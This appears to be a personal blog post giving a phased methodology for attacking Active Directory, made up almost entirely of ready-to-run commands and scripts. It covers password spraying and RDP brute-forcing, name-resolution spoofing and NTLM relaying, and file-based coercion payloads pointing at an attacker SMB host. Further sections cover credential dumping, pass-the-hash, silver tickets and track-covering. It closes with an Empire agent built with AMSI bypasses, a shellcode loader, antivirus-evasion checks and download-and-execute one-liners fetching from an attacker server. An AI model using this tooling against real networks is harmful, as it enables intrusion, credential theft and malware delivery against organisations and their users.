---
layout: '../../layouts/Post.astro'
title: 'Active Directory - Attack Methodology'
image: '/images/kerberos2'
# image: 'https://22863376c5.clvaw-cdnwnd.com/2c46b638ae8400165ec727f2390cd862/200000109-4dacc4dacf/0_0k6y3ytGb8Fjtrnr.webp?ph=22863376c5'
publishedAt: "2023-10-1"
category: 'AD'
---

## Overview

This is a work in progress, but useful now. This is a methodology for attacking AD, it's broken up into phases that I expect to use different tools or techniques. 

<!-- ```js
let foo = 'bar';

console.log(foo);
``` -->

<!-- ![image](https://unsplash.it/400/300) -->







## Phase 1 - No Creds

## 1a. Network Recon

### PowerShell - Ping Scan
```powershell
pwsh
$subnet = "192.168.2."
$timeout = 1000


for ($i = 1; $i -lt 255; $i++) {
    $ip = $subnet + $i
    $ping = New-Object System.Net.NetworkInformation.Ping
    $result = $ping.Send($ip, $timeout)
    if ($result.Status -eq "Success") {
        Write-Host "$ip is alive, jurassic5!"
    }
}
```

### Powershell - Single IP Port Scan
```powershell
$ports = 21,22,23,25,53,80,111,135,137,139,389,443,445,636,1099,1199,1433,1583,1900,2435,3306,3389,5060,5432,5985,5986,7001,7002,7003,7004,8000,8009,8080,8443,8880,9080,9443
$ip = "$ip" # Replace with the target IP address
$results = @()
$portStatus = @{}
foreach ($port in $ports) {
    $open = Test-NetConnection -ComputerName $ip -Port $port -InformationLevel Quiet
    $portStatus[$port] = $open
}
$result = New-Object -TypeName PSObject -Property @{
    ip = $ip
    ports = $portStatus | Where-Object { $_.Value -eq 'True' } | Select-Object -ExpandProperty Name
}
$results += $result
$results | Where-Object { $_.ports } | Select-Object -Property ip,ports
```

### PowerShell - TCP CIDR Port Scan 
```powershell
$ports = 21,22,23,25,53,80,111,135,137,139,389,443,445,636,1099,1199,1433,1583,1900,2435,3306,3389,5060,5432,5985,5986,7001,7002,7003,7004,8000,8009,8080,8443,8880,9080,9443
#### Define the CIDR range to scan
$cidr = "$cidr"
#### Create an empty array to store the results
$results = @()
#### Loop through each IP address in the CIDR range and test each port
1..254 | ForEach-Object {
    $ip = "192.168.0.$_"
    $portStatus = @{}
    foreach ($port in $ports) {
        $open = Test-NetConnection -ComputerName $ip -Port $port -InformationLevel Quiet
        $portStatus[$port] = $open
    }
    $result = New-Object -TypeName PSObject -Property @{
        ip = $ip
        ports = $portStatus | Where-Object { $_.Value -eq 'True' } | Select-Object -ExpandProperty Name
    }
    $results += $result
}
#### Display the results for IPs with open ports
$results | Where-Object { $_.ports } | Select-Object -Property ip,ports
```

### Powershell - UDP Port Scan
```powershell
$ports = 53,67,68,88,123,137,138,139,389,445,464,500,514,520,631,1434,1900,4500
#### Define the CIDR range to scan
$cidr = "$cidr"
#### Create an empty array to store the results
$results = @()
#### Loop through each IP address in the CIDR range and test each UDP port
1..254 | ForEach-Object {
    $ip = "192.168.0.$_"
    $portStatus = @{}
    foreach ($port in $ports) {
        $udp = New-Object System.Net.Sockets.UdpClient
        try {
            $udp.Connect($ip, $port)
            $open = $true
        } catch {
            $open = $false
        }
        $udp.Close()
        $portStatus[$port] = $open
    }
    $result = New-Object -TypeName PSObject -Property @{
        ip = $ip
        ports = $portStatus | Where-Object { $_.Value -eq 'True' } | Select-Object -ExpandProperty Name
    }
    $results += $result
}
#### Display the results for IPs with open ports
$results | Where-Object { $_.ports } | Select-Object -Property ip,ports
```

#### Sneaky Script to perform a "dirty spray" using DSACLS
```powershell
$fqdn = ((cmd /c set u)[-3] -split "=")[-1]
$suffix = "local"
$pdc = ((nltest.exe /dcname:$fqdn) -split "\\\\")[1]
$lockoutBadPwdCount = ((net accounts /domain)[7] -split ":" -replace " ","")[1]
$password = "123456"
#### (Get-Content users.txt)
"krbtgt","spotless" | % {
    $badPwdCount = Get-ADObject -SearchBase "cn=$_,cn=users,dc=$fqdn,dc=$suffix" -Filter * -Properties badpwdcount -Server $pdc | Select-Object -ExpandProperty badpwdcount
    if ($badPwdCount -lt $lockoutBadPwdCount - 3) {
        $isInvalid = dsacls.exe "cn=domain admins,cn=users,dc=$fqdn,dc=$suffix" /user:$_@$fqdn.$suffix /passwd:$password | select-string -pattern "Invalid Credentials"
        if ($isInvalid -match "Invalid") {
            Write-Host "[-] Invalid Credentials for $_ : $password" -foreground red
        } else {
            Write-Host "[+] Working Credentials for $_ : $password" -foreground green
        }        
    }
}
```


### RDP - Crowbar - Brute-Force
```bash
sudo apt install -y nmap openvpn freerdp2-x11 tigervnc-viewer impacket- impacket--pip
git clone https://github.com/galkan/crowbar
cd crowbar/
pip3 install -r requirements.txt
```

#### RDP - Crowbar - trying admin account, Single IP, User, Passwordlist
```bash
user="$user"
domain=$fqdn
IP="$VMIP"
wordlist=".\knownpasswords.txt"
./crowbar.py -b rdp -s $IP -u $user -C $wordlist
```

#### RDP - Crowbar - Domain-Specific RDP Attack against CIDR, scanning first for RDP then trying our list with mellonaut
```bash
user="mellonaut"
domain=$fqdn
cidr="$cidr"
wordlist=".\knownpasswords.txt"
./crowbar.py -b rdp -s $cidr -u $user@$fqdn -C $wordlist
```

#### RDP - Crowbar - Discovery Mode Domain-Specific RDP Attack against CIDR, scanning first for RDP then trying userlist with password list
```bash
cidr="$cidr"
userlist="users.txt"
wordlist=".\knownpasswords.txt"
./crowbar.py -b rdp -s $cidr -U $userlist -C $wordlist -d
```

### RDP - Hydra - Brute-force
```bash
hydra -t 1 -V -f -l $user -P $wordlist rdp://$IP
hydra -t 1 -V -f -l $user@$fqdn -P $wordlist rdp://$IP
```

## 1b. Coercion and Relays

### Kerbrute - Pre-Auth Enumeration and Spray
```bash
dc="$ip"
domain=$fqdn 
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x ./kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum -d $fqdn --dc $dc ./users.txt
#### Spray our Known Good Local Admin password
./kerbrute_linux_amd64 passwordspray -d $fqdn --dc $dc ./users.txt $password
#### Bruting with Pre-Auth  user/pass combolist
cat combos.txt | ./kerbrute_linux_amd64 -d $fqdn bruteforce -
```

### CrackMapExec
```bash
wget https://github.com/Porchetta-Industries/CrackMapExec/releases/download/v5.4.0/cme-ubuntu-latest-3.11.zip
wget https://github.com/Porchetta-Industries/CrackMapExec/releases/download/v5.4.0/cmedb-ubuntu-latest-3.11.zip
unzip cme-ubuntu-latest-3.10.zip
unzip cmedb-ubuntu-latest-3.11.zip  
chmod +x cme
chmod +x cmedb
rm cme-ubuntu-latest-3.11.zip
rm cmedb-ubuntu-latest-3.11.zip  
```

#### New Window, Generate Relay List
```bash
crackmapexec smb --gen-relay-list relays.txt $cidr
```

#### Crackmapexec Brute Force Services LDAP SMB RDP (Warning: can lock stuff out like crazy)
```bash
crackmapexec ldap $cidr -u $user -p $wordlist
crackmapexec smb $cidr -u $user -p $wordlist
crackmapexec rdp $ip -u $user -p $wordlist 
```

#### Crackmapexec --no-bruteforce can be useful for MSSQL and WinRM
```bash
crackmapexec mssql $cidr -u $users -p $wordlist --no-bruteforce
crackmapexec winrm $cidr -u $users -p $wordlist --no-bruteforce
```

#### Crackmapexec Spray
```bash
crackmapexec ldap $ip -u $users -p $password
crackmapexec smb $ip -u $users -p $password
crackmapexec rdp $ip -u $users -p $password
crackmapexec winrm $ip -u $users -p $password
```

#### Spray to check for password re-use
```bash
crackmapexec ldap $ip -u $users -p $password --coontinue-on-success
crackmapexec smb $ip -u $users -p $password --coontinue-on-success
```

### Pretender
```bash
wget https://github.com/RedTeamPentesting/pretender/releases/download/v1.0.0/pretender_1.0.0_Linux_x86_64.tar.gz
tar -xvf ./pretender_1.0.0_Linux_x86_64.tar.gz
chmod +x pretender
```

#### Start with quiet mode for recon
```bash
if="eth0"
./pretender -i $if --dry
./pretender -i $if --dry --no-ra # without router advertisements
```

#### Try local name resolution spoofing via mDNS, LLMNR and NetBIOS-NS as well as a DHCPv6 DNS takeover with router advertisement

#### You can disable certain attacks with --no-dhcp-dns (disabled DHCPv6, DNS and router advertisements), --no-lnr (disabled mDNS, LLMNR and NetBIOS-NS), --no-mdns, --no-llmnr, --no-netbios and --no-ra
```bash
./pretender -i $if
```

#### If NTLM Relay is running on a different host ( that's IPv6 )
```bash
./pretender -i $if -4 10.0.0.10 -6 fe80::5
```

#### Spoof specific domain, Excluding specific hosts from spoofing
```bash
./pretender -i $if --spoof $fqdn --dont-spoof-for $ip,defended-edr2 $fqdn fe80::f --ignore-no$fqdn
```

### MITM6 
```bash
pip install mitm6
git clone https://github.com/dirkjanm/mitm6.git
cd mitm6
pip install -r ./requirements.txt
#### Run default
mitm6 -i $if -d $fqdn
```

#### Run with a relay target and debug information, optionally ignore dhcp6 requests for queries that dont contain $fqdn
```bash
mitm6 -i $if -r $ip --debug ( --ignore-nofqd )
```




### NTLMRelayX

#### New Window, Start NTLMRelayX w/ IPv6, edit ProxyChains config
```bash
./ntlmrelayx.py -6 -socks -smb2support -tf relays.txt
impacket-ntlmrelayx -6 -socks -smb2support -tf relays.txt
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

#### Check list of captured sessions in ntlmnrely console
```bash
socks
```

#### SMB Exec over Socks w/ required rights and no AV blocks
```bash
proxychains4 -q smbexec.py $fqdn $user:$password@$ip
```

#### Grab Local Admin hash using Secretsdump
```bash
proxychains4 -q secretsdump.py $fqdn $user:$password@$ip
```

#### may have to use VSS
```bash
proxychains4 -q secretsdump.py -use-vss  $fqdn $user:$password@$ip  
```

#### Create Machine Account over LDAPS ( S required)
```bash
ntlmrelayx.py -t ldaps://domain.srhine.earth --add-computer
```

#### Automate Impacket, CME over SOCKS https://github.com/He-No/ntlmrelayx2proxychains
```bash
python3 ntlmrelay2proxychains.py --action {shares|lsa|sam|...} [--exclude] [--adminonly] [--help]
```

#### Execute command / Implant Launcher
```bash
oneliner=""
ntlmrelayx.py -6 -tf relays.txt -c $oneliner
```

## Phase 1c. Playbooks

#### Initial Relay to PrinterBug
##### Pretender Recon, see what's saying what to whom 
```bash
./pretender -i $if --dry --no-ra # without router advertisements
```

##### Local name resolution spoofing via mDNS, LLMNR and NetBIOS-NS as well as a DHCPv6 DNS takeover with router advertisement

##### You can disable certain attacks with --no-dhcp-dns (disabled DHCPv6, DNS and router advertisements), --no-lnr (disabled mDNS, LLMNR and NetBIOS-NS), --no-mdns, --no-llmnr, --no-netbios and --no-ra
```bash
./pretender -i $if --dont-spoof-for 172.20.48.1
```

##### Crackmapexec - Generate Relay List / initial SMB recon on CIDR
```bash
crackmapexec smb --gen-relay-list relays.txt $cidr
```

##### NTLMRelayX - Start w/ IPv6, edit ProxyChains config
```bash
./ntlmrelayx.py -6 -socks -smb2support -tf relays.txt
impacket-ntlmrelayx -6 -socks -smb2support -tf relays.txt
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080
```

##### Printerbug straight and hail mary via socks w/ no password
```bash
attacker="192.168.0.243"
wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/printerbug.py
chmod +x ./printerbug.py
##### Check service running
impacket-rpcdump $ip | grep -A 6 "spoolsv"
##### Straight up
./printerbug.py $fqdn/$user:$password@$ip $attacker
##### Relay without creds
impacket-ntlmrelayx -t smb://$ip -socks
proxychains ./printerbug.py -no-pass $fqdn/$user@$ip $attacker
share="\\192.168.0.243\share"
```

#### Windows - Start Farmer to collect hashes, Crop to generate new lnks and fertilizer to backdoor exisitng documents on shares
```powershell
Farmer.exe 7443
Crop.exe 
Fertiliser.exe 
```

#### Coerce 1 - Url File for Shares Pointing back to our SMB Server
```powershell
[InternetShortcut]
URL=jdate.com
WorkingDirectory=wdir
IconFile=\\192.168.0.243\%USERNAME%.icon
IconIndex=1
```

##### Make sure 'view file extenxions' is on, create a new text file on share, paste that in, rename the file to .url extension

#### Coerce 2 - RTF that tries to load image
```powershell
{\rtf1{\field{\*\fldinst {INCLUDEPICTURE "file://192.168.0.243/test.jpg" \\* MERGEFORMAT\\d}}{\fldrslt}}}
```

#### Coerce 3 - HTML
```html
<!DOCTYPE html>
<html>
	<img src="file://192.168.0.243/share/leak.png"/>
</html>
```

#### Coerce 4 - Office XML, Add to Word document( wont work with protectedView )
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
	<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="file://192.168.0.243/share/Template.dotx" TargetMode="External"/>
</Relationships>
```

#### Coerce 5 - Url Handler
```html
<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\192.168.0.243/share/leak.docx';
	</script>
</html>
```

#### Coerce 6 - w/ Creds - Coercer forced authentication of a server to our machine
```bash
listen="192.168.0.243"
ip="192.168.0.238"
cidr="192.168.0.0/24"
user="adelev"
password="Password123"
domain="shrine"
fqdn="shrine.earth"
dc="domain.shrine.earth"
pip install coercer
coercer scan -t $ip -u $user -p $password -d $fqdn -v
coercer coerce -t $ip -l $listen -u $user -p $password -d $fqdn -v
```

#### Coerce 7 - w / Creds - DFSCoerce (domain controller only)
```bash
wget https://raw.githubusercontent.com/Wh04m1001/DFSCoerce/main/dfscoerce.py
chmod +x ./dfscoerce.py
./dfscoerce.py -d $fqdn -u $user -p $password $listen $ip
```


# Phase 2: New in Town - First Creds

## 2a. Over and Over, until it's done

### LDAP - Recon with nmap using first basic user rights
```bash
ip="$ip"
nmap -p 389 --script ldap-search \
--script-args "ldap.username=$fqdn$user',ldap.password='$password',ldap.base='dc$fqdnth',ldap.filter='(&(objectclass=user)(|(memberof=CN=Domain Admins,CN=Users,DC$fqdnth)(memberof=CN=Administrators,CN=Builtin,DC$fqdnth)))'" \
-oA domainrecon $ip
```

### Bloodhound
#### Linux Version - Python Collector
```bash
pip install impacket
pip install ldap3
pip install dnsimpacket-pip install bloodhound
``` 
 or
 
```bash 
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
pip install .
```

#### Docker
# Bloodhound Container
```bash
docker run -it \
  -p 7474:7474 \
  -e DISPLAY=unix$DISPLAY \
  -v /tmp/.X11-unix:/tmp/.X11-unix \
  --device=/dev/dri:/dev/dri \
  -v $(pwd)/bh-data:/data \
  --name bloodhound belane/bloodhound
```

### Jackdaw - Open http://127.0.0.1:5000/ui for the API
```bash
git clone https://github.com/skelsec/jackdaw.git
cd jackdaw
sudo chmod +x ./setup.py
sudo impacket- ./setup.py
jackdaw auto
jackdaw --sql sqlite:///test.db enum 'ldap+ntlm-password://TEST\victim:Passw0rd!@10.10.10.2' 'smb+ntlm-password://TEST\victim:Passw0rd!@10.10.10.2'
jackdaw --sql sqlite:///test.db ldap 'ldap+ntlm-password://TEST\victim:Passw0rd!@10.10.10.2'
jackdaw --sql sqlite:///<FULL PATH TO DB> nest
```

### WMI - Pass Local Admin Hash, MUST ADD 0's AT THE BEGINNING
```bash
wmiexec.py -hashes '00000000000000000000000000000000:2b576acbe6bcfda7294d6bd18041b8fe' administrator@$ip
```

### Evil-WinRM - Pass Local Admin Hash
```bash
evil-winrm -u Administrator -H '2b576acbe6bcfda7294d6bd18041b8fe' -i $ip
```

### RDP 

#### XfreeRDP - Pass the Hash
```bash
xfreerdp /u:Administrator /pth:2b576acbe6bcfda7294d6bd18041b8fe /v:$ip
```

### Crackmapexec - Laying Waste to the Domain

#### Crackmapexec Using Hashes
```bash
crackmapexec ldap $ip -u $user -H $hash
crackmapexec smb $ip -u $user -H $hash
crackmapexec rdp $ip -u $user -H $hash
crackmapexec winrm $ip -u $user -H $hash
```

#### Crackmapexec using kerberos
```bash
crackmapexec ldap $$fqdn -k -u $users -p $password
crackmapexec smb $$fqdn -k -u $users -p $password
crackmapexec rdp $$fqdn -k -u $users -p $password
crackmapexec winrm $$fqdn -k -u $users -p $password
```

#### or using kcache
```bash
export KRB5CCNAME=/home/bonclay/impacket/administrator.ccache 
crackmapexec ldap $$fqdn --use-kcache
crackmapexec smb $$fqdn --use-kcache -x whoami
crackmapexec rdp $$fqdn --use-kcache
crackmapexec winrm $$fqdn --use-kcache
```

#### Using w/ KDC option
```bash
crackmapexec smb $$fqdn -k --kdcHost $ip
crackmapexec ldap $$fqdn -k --kdcHost $ip
```

#### Dump NTDS.dit with local/domain admin rights
```bash
crackmapexec smb $ip -u $user -p $password --ntds
crackmapexec smb $ip -u $user -p $password --ntds --users
crackmapexec smb $ip -u $user -p $password --ntds --users --enabled
crackmapexec smb $ip -u $user -p $password --ntds vss
```

#### Check spooler/webdav running
```bash
crackmapexec smb $ip -d $fqdn -u "$user" -p $password -M spooler
crackmapexec smb $ip -d $fqdn -u "$user" -p $password -M webdav
```

#### Cred Modules
```bash
-M lsassy
-M teams_localdb
-M 
```

#### Bloodhound Integration
```bash
.vim /.cme/cme.conf

[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass
```

### Kerberos 

#### Create Machine Account for Silver Ticket / over LDAPS ( S required)
```bash
ntlmrelayx.py -t ldaps://domain.srhine.earth --add-computer
```

#### Silver Ticket - Use Machine Account Hash w/ SPN to create silver ticket 
```bash
impacket-ticketer -nthash $hash -domain-sid $domainSID -domain $domain -spn mssql/domain.shrine.earth Administrator 
python3 ticketer.py -nthash $hash -domain-sid $domainSID -domain $domain -spn mssql/domain.shrine.earth Administrator
```

## 2b. Playbooks

### Internal Pentest - Should have pretender and your relay solution still running. 

#### CrackMapExec enumeration
```bash
ip="192.168.0.238"
cidr="192.168.0.0/24"
user="adelev"
password="Password123"
domain="shrine"
fqdn="shrine.earth"
dc="domain.shrine.earth"
```

#### Low hanging fruit - null sessions, pass pol, recon, anonymous logon
```bash
crackmapexec smb $cidr
crackmapexec smb $cidr -u '' -p ''
crackmapexec smb $cidr --pass-pol
crackmapexec smb $cidr -u 'a' -p ''
```

#### Search Shares, Spider, Spider better, Dump all files
```bash
crackmapexec smb $ip -d $fqdn -u "$user" -p $password --users
crackmapexec smb $ip -d $fqdn -u "$user" -p $password --groups
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password --shares
crackmapexec smb $ip -d $fqdn -u "$user" -p $password --spider C\$ --pattern txt
crackmapexec smb $ip -d $fqdn -u "$user" -p $password -M spider_plus
crackmapexec smb $ip -d $fqdn -u "$user" -p $password -M spider_plus -o READ_ONLY=false
```

#### Sweep the CIDR for Sessions
```bash
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password  --sessions
```

#### local groups
```bash
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password --local-groups
```

#### Search for the easy buttons
```bash
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password -M zerologon
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password -M petitpotam
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password -M nopac
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password -M spooler
crackmapexec smb $cidr -d $fqdn -u "$user" -p $password -M webdav
crackmapexec ldap $ip -d $fqdn -u "$user" -p $password -M MAQ
impacket-Get-GPPPassword -no-pass $dc
impacket-Get-GPPPassword  $fqdn/$user:$password@$dc
```

#### RPC Map and Dump
```bash
impacket-rpcmap "ncacn_ip_tcp:$ip"
impacket-rpcdump $fqdn/$user:$password@$ip
```

#### Check our RDP access
```bash
impacket-rdp_check $fqdn/$user:$password@$ip 
```

#### Add Computer
```bash
impacket-addcomputer -computer-name 'JUSTAPRINTER$' -computer-pass 'PCLoadLetter' -dc-host $ip $fqdn/$user:$password
```

#### Change password of Computer we find
```bash
impacket-addcomputer -computer-name 'WS1$' -computer-pass 'PCLoadLetter' -dc-host $ip -no-add $fqdn/$user:$password
```

#### Delete Machine to cover tracks
```bash
impacket-addcomputer -computer-name 'JUSTAPRINTER$' -computer-pass 'PCLoadLetter' -dc-host $ip -delete $fqdn/$user:$password
```

## Phase 3: Roots and Escalation

## 3a. Lateral Spread and Domain Escalation
Handy Reference for Anything Not Covered: https://tools.thehacker.recipes/impacket/examples

#### kerbrute to enumerate further users and spray quietly
```bash
./kerbrute_linux_amd64 userenum -d $fqdn --dc $dc ./users.txt
```

#### Check re-use our Known Good Local Admin password
```bash
./kerbrute_linux_amd64 passwordspray -d $fqdn --dc $ip ./users.txt $password
```

#### lookup SIDs
```bash
impacket-lookupsid $fqdn/$user:$password@$ip
```

#### Attempt ASREPRoast for ALL users
```bash
 impacket-GetNPUsers -dc $dc $fqdn/$user:$password -request -format hashcat -outputfile asrephashparty
 impacket-GetNPUsers -dc $dc $fqdn/-usersfile -request -format hashcat -outputfile asrephashparty
```

#### Attempt kerberoasting
```bash
impacket-GetUserSPNs -dc $dc $fqdn/$user:$password -outputfile kerberoastin
```

#### Look for delegation across domain
```bash
impacket-findDelegation -dc $dc $fqdn/$user:$password
```

#### Netview recon
```bash
impacket-netview -dc $dc $fqdn/$user:$password -targets targets.txt -users ./users.txt
```

#### SAMR Dump
```bash
impacket-samrdump $fqdn/$user:$password@$ip
```

#### Services controller
```bash
impacket-services $fqdn/$user:$password@$ip list
```

#### Overpass the Hash/Key
#### Request the TGT with hash
```bash
impacket-getTGT -dc $dc $fqdn/$user -hashes $hash       # [lm_hash]:<ntlm_hash>
```

#### Request the TGT with aesKey (more secure encryption, probably more stealth due is the used by default by Microsoft)
```bash
impacket-getTGT <domain_name>/<user_name> -aesKey $key
```

#### Request the TGT with password
```bash
impacket-getTGT -dc $dc $fqdn/$user:$password
### If not provided, password is asked
```

#### Set the TGT for impacket use
```bash
tgt="Administrator.ccache"
export KRB5CCNAME=$tgt
```
#### Execute remote commands with any of the following by using the TGT
```bash
target="$dc"
impacket-psexec -dc $dc $fqdn/$user@$target -k -no-pass
impacket-smbexec -dc $dc $fqdn/$user@$target -k -no-pass
impacket-wmiexec -dc $dc $fqdn/$user@$target -k -no-pass
impacket-dcomexec -object MMC20 -dc $dc $fqdn/$user@$target -k -no-pass
```

#### DCOM and AT Execs
```bash
impacket-dcomexec -object MMC20 -dc $dc $fqdn/$user:$password@$target
impacket-atexec -dc $dc $fqdn/$user:$password@$target whoami
```

#### Dump the NTDS.dit
```bash
impacket-secretsdump -dc $dc $fqdn/$user:$password@$target
```


### 3b. - Establishing Roots

#### Start empire
```bash
pip3 install donut-shellcode
powershell-empire server
powershell-empire client
```

#### Set up http listener
```bash
uselistener http
set Host http://192.168.0.243
set Port 8889
generate

#### Roslyn Compiled C Sharp Agent (hotlanta)
#### CSharp Server
useplugin csharpserver
set status start
execute
```

#### CSharp Agent 
```bash
usestager windows_csharp_exe
set OutFile sharpies.exe
set Listener http
set Bypasses mattifestation etw ScriptBlockLogBypass
generate
```

#### Serve and Oneliner

```bash
# On Server
python3 -m http.server
```

```powershell
# On Target
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.0.243:8000/sharpies.exe')|iex"
```

#### loader from snovvcras for readme.ps1/md
```powershell
$Win32 = @"

using System;

using System.Runtime.InteropServices;

public class Win32 {

[DllImport("kernel32")]

public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32", CharSet=CharSet.Ansi)]

public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll", SetLastError=true)]

public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

}

"@

Add-Type $Win32

[Byte[]] $buf = <shellcode>

$size = $buf.Length

[IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)

[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF") 
```


#### Shellcode

#### Powershell shellcode launcher lives in readme.md with a byte array for our empire/donut agent
```powershell
cat .\readme.ps1 
```

#### AMSI bypass lives in read.md, it bypasses, sleeps for 6 seconds. We add our dropper one-liner after the sleep command.
```powershell
cat .\read.md
```

#### Obfuscate Prior to Donut
```powershell
.\confuser.cli.exe .\sharpire.exe -o sharpies.exe
```

#### Donut to convert to powershell format
```powershell
.\donut.exe .\sharpies.exe -f 6
cat .\loader.ps1
```

#### Copy and Paste the Shellcode from loader.ps1 into the byte array from readme.md (launcher)
```bash
vim .\readme.md
```

#### Create our oneliner
```powershell
c2="http://192.168.0.243:8000"
$str= "iex (new-object system.net.webclient).downloadstring('http://192.168.0.243:8000/readme.ps1')"
```

#### Encode it for execution
```powershell
$drop = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

#### Add Base64 oneliner-dropper after the start-sleep -s 6 inside read.md
#### use powershell -encodedcommand $dropperstring and add that to read.md after the sleep
```bash
vim .\read.md
```

#### We would host this on our payload server and can just swap out the shellcode for different agents and control channels

#### Create initial execution dropper to run read.md which bypasses amsi and runs readme.md to execute empire
```powershell
$str= "iex (new-object system.net.webclient).downloadstring('http://192.168.0.243:8000/read.ps1')"
$initial = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

#### Use lnk2pwn to create .lnk with "/c powershell -encoded $initial"
```powershell
java -jar .\lnk2pwn-1.0.0.jar
```

#### Check .ps1 payloads with AMSI Trigger prior to renaming extension to .md
```powershell
.\AmsiTrigger.exe -d -u http://192.168.0.243:8000/readme.ps1
.\AmsiTrigger.exe -d -u http://192.168.0.243:8000/read.ps1
```

#### Save $initial into a script and add "powershell -encoded"
```powershell
.\AmsiTrigger.exe -d -u http://192.168.0.243:8000/initial.ps1
```

#### ThreatCheck for Defender
```powershell
.\threatcheck.exe -u http://192.168.0.243:8000/readme.ps1 -e Defender
.\threatcheck.exe -u http://192.168.0.243:8000/read.ps1 -e Defender
.\threatcheck.exe -u http://192.168.0.243:8000/initial.ps1 -e Defender
```

#### Check .ps1 payloads with AMSI Trigger prior to renaming extension to .md to see what lines may needs obfuscation

#### Save $initial into a script initial.ps1 and add "powershell -encoded" so we can test it too
```powershell
.\AmsiTrigger.exe -d -u -f 3 http://192.168.0.243:8000/readme.ps1
.\AmsiTrigger.exe -d -u -f 3 http://192.168.0.243:8000/read.ps1
.\AmsiTrigger.exe -d -u -f 3 http://192.168.0.243:8000/initial.ps1 
```

#### One Liner
```powershell
powershell -exec bypass -encodedcommand $b64
```